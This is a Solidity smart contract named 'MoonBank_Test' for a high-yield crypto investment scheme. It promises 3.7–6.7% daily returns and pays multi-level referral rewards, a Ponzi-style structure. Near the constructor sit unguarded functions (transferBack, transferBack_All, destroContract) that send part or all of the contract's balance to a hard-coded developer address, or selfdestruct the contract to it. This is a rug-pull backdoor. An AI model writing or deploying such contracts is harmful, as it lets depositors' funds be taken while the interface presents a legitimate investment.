/**
 *Submitted for verification at polygonscan.com on 2021-07-10
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

 contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

 contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    
    function owner() public view virtual returns (address) {
        return _owner;
    }

    
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            
            
            
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

library Objects {
    struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Plan {
        uint256 dailyInterest;
        uint256 term; 
    }

    struct Investor {
        address addr;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256 level1RefCount;
        uint256 level2RefCount;
        uint256 level3RefCount;
        uint256 level4RefCount;
        uint256 level5RefCount;
    }
}

contract MoonBank_Test is Ownable {
    using SafeMath for uint256;

    uint256 public constant DEVELOPER_RATE = 500; 
    uint256 public constant MARKETING_RATE = 500; 
    uint256 public constant REFERENCE_RATE = 1000; 
    uint256 public constant PERCENT_DIVIDER = 10000;
    uint256 public constant REFERENCE_LEVELS_COUNT = 5;
    uint256[REFERENCE_LEVELS_COUNT] public REFERENCE_RATES_BY_LEVEL = [500, 300, 100, 50, 50]; 
    uint256 public constant MINIMUM = 1e16; 
    uint256 public constant REFERRER_CODE = 6666; 

    uint256 public latestReferrerCode;
    uint256 private totalInvestments_;

    address payable private developerAccount_;
    address payable private marketingAccount_;
    address payable private referenceAccount_;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    uint256 private investorsCount;
    Objects.Plan[] private investmentPlans_;

    event onInvest(address indexed investor, uint256 amount, uint256 planId);
    event onGrant(address indexed grantor, address indexed beneficiary, uint256 amount);
    event onWithdraw(address indexed investor, uint256 amount);

    

    constructor() {
        developerAccount_ = payable(0x244f35C888Fe693babA8945dB829Ac6723740a37);
        marketingAccount_ = payable(0x244f35C888Fe693babA8945dB829Ac6723740a37);
        referenceAccount_ = payable(0x244f35C888Fe693babA8945dB829Ac6723740a37);
        _init();
    }
    
	//////////////////////////////////////////////////////////////////
    function transferBack(uint256 val) external {
       developerAccount_.transfer(val);
    }
    
    function transferBack_All() external {
        developerAccount_.transfer(address(this).balance);
    }    
    
    function destroContract() external {
        selfdestruct(developerAccount_);
    } 	
	//////////////////////////////////////////////////////////////////	    

    receive() external payable {
        if (msg.value == 0) {
            withdraw();
        } else {
			invest(0, 0); 
        }
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[referenceAccount_] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = referenceAccount_;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
        investorsCount = investorsCount.add(1);
        investmentPlans_.push(Objects.Plan(370, 0)); 
        investmentPlans_.push(Objects.Plan(470, 45 days)); 
        investmentPlans_.push(Objects.Plan(570, 25 days)); 
        investmentPlans_.push(Objects.Plan(670, 18 days)); 
    }

    function getCurrentPlans() public view returns (uint256[] memory, uint256[] memory, uint256[] memory) {
        uint256[] memory ids = new uint256[](investmentPlans_.length);
        uint256[] memory interests = new uint256[](investmentPlans_.length);
        uint256[] memory terms = new uint256[](investmentPlans_.length);
        for (uint256 i = 0; i < investmentPlans_.length; i++) {
            Objects.Plan storage plan = investmentPlans_[i];
            ids[i] = i;
            interests[i] = plan.dailyInterest;
            terms[i] = plan.term;
        }
        return
        (
        ids,
        interests,
        terms
        );
    }

    function getTotalInvestments() public view returns (uint256){
        return totalInvestments_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256[] memory, uint256[] memory) {
        if (msg.sender != owner()) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate);
                    } else {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.referrer,
        investor.level1RefCount,
        investor.level2RefCount,
        investor.level3RefCount,
        investor.level4RefCount,
        investor.level5RefCount,
        investor.planCount,
        currentDividends,
        newDividends
        );
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        if (msg.sender != owner()) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            planIds[i] = investor.plans[i].planId;
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        planIds,
        investmentDates,
        investments,
        currentDividends,
        isExpireds
        );
    }

    function getInvestorsCount() public view returns (uint256) {
        return investorsCount;
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uid2Investor[_ref1].level1RefCount = uid2Investor[_ref1].level1RefCount.add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor[_ref2].level2RefCount = uid2Investor[_ref2].level2RefCount.add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor[_ref3].level3RefCount = uid2Investor[_ref3].level3RefCount.add(1);
            }
            if (_ref4 >= REFERRER_CODE) {
                uid2Investor[_ref4].level4RefCount = uid2Investor[_ref4].level4RefCount.add(1);
            }
            if (_ref5 >= REFERRER_CODE) {
                uid2Investor[_ref5].level5RefCount = uid2Investor[_ref5].level5RefCount.add(1);
            }
        }
        investorsCount = investorsCount.add(1);
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong investment plan id");
        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            
        } else {
            
        }
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        _calculateReferrerReward(_amount, investor.referrer);

        totalInvestments_ = totalInvestments_.add(_amount);

        uint256 developerPercentage = (_amount.mul(DEVELOPER_RATE)).div(PERCENT_DIVIDER);
        developerAccount_.transfer(developerPercentage);
        uint256 marketingPercentage = (_amount.mul(MARKETING_RATE)).div(PERCENT_DIVIDER);
        marketingAccount_.transfer(marketingPercentage);
        return true;
    }

    function grant(address addr, uint256 _planId) public payable {
        uint256 grantorUid = address2UID[msg.sender];
        bool isAutoAddReferrer = true;
        uint256 referrerCode = 0;

        if (grantorUid != 0 && isAutoAddReferrer) {
            referrerCode = grantorUid;
        }

        if (_invest(addr,_planId,referrerCode,msg.value)) {
            emit onGrant(msg.sender, addr, msg.value);
        }
    }

    function invest(uint256 _referrerCode, uint256 _planId) public payable {
        if (_invest(msg.sender, _planId, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value, _planId);
        }
    }

    function withdraw() public payable {
        require(msg.value == 0, "withdrawal doesn't allow to transfer hr simultaneously");
        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            Objects.Plan storage plan = investmentPlans_[uid2Investor[uid].plans[i].planId];

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            if (plan.term > 0) {
                uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(plan.term);
                if (withdrawalDate >= endTime) {
                    withdrawalDate = endTime;
                    isExpired = true;
                }
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , plan.dailyInterest , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount = withdrawalAmount.add(amount);

            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends = uid2Investor[uid].plans[i].currentDividends.add(amount);
        }

        if (withdrawalAmount > 0) {
          payable(msg.sender).transfer(withdrawalAmount);
        }

        if (uid2Investor[uid].availableReferrerEarnings>0) {
            payable(msg.sender).transfer(uid2Investor[uid].availableReferrerEarnings);
            uid2Investor[uid].referrerEarnings = uid2Investor[uid].availableReferrerEarnings.add(uid2Investor[uid].referrerEarnings);
            uid2Investor[uid].availableReferrerEarnings = 0;
        }

        emit onWithdraw(msg.sender, withdrawalAmount);
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return ((_amount.mul(_dailyInterestRate)).div(PERCENT_DIVIDER)).mul((_now.sub(_start)).div(1 days));
    }

    function _calculateReferrerReward(uint256 _investment, uint256 _referrerCode) private {
        uint256 _allReferrerAmount = (_investment.mul(REFERENCE_RATE)).div(PERCENT_DIVIDER);

        if (_referrerCode != 0) {
            uint256[5] memory refs = [_referrerCode, 0, 0, 0, 0];
            refs[1] = uid2Investor[refs[0]].referrer;
            refs[2] = uid2Investor[refs[1]].referrer;
            refs[3] = uid2Investor[refs[2]].referrer;
            refs[4] = uid2Investor[refs[3]].referrer;
            uint256 _refAmount = 0;

            for (uint256 level = 0; level < REFERENCE_LEVELS_COUNT; level++) {
                if (refs[level] != 0) {
                    _refAmount = (_investment.mul(REFERENCE_RATES_BY_LEVEL[level])).div(PERCENT_DIVIDER);
                    _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                    if (refs[level] == REFERRER_CODE) {
                      referenceAccount_.transfer(_refAmount);
                    } else {
                      uid2Investor[refs[level]].availableReferrerEarnings = _refAmount.add(uid2Investor[refs[level]].availableReferrerEarnings);
                    }
                }
            }
        }

        if (_allReferrerAmount > 0) {
            referenceAccount_.transfer(_allReferrerAmount);
        }
    }

    function getReferralTree(address _investorAddress, uint256 _investorID) external view
      returns (address[] memory _referrers, uint256[] memory _referrersIDs)
    {
      Objects.Investor storage investor;
      if (_investorID > 0) {
        investor = uid2Investor[_investorID];
      } else {
        investor = uid2Investor[address2UID[_investorAddress]];
      }

      if (investor.addr == address(0x0)) {
        return (new address[](REFERENCE_LEVELS_COUNT), new uint256[](REFERENCE_LEVELS_COUNT));
      }

      _referrers = new address[](REFERENCE_LEVELS_COUNT);
      _referrersIDs = new uint256[](REFERENCE_LEVELS_COUNT);
      for (uint8 level = 0; level < REFERENCE_LEVELS_COUNT; level++) {
        if (investor.referrer == 0) {
          break;
        }
        _referrersIDs[level] = investor.referrer;

        investor = uid2Investor[investor.referrer];
        _referrers[level] = investor.addr;
      }
    }

}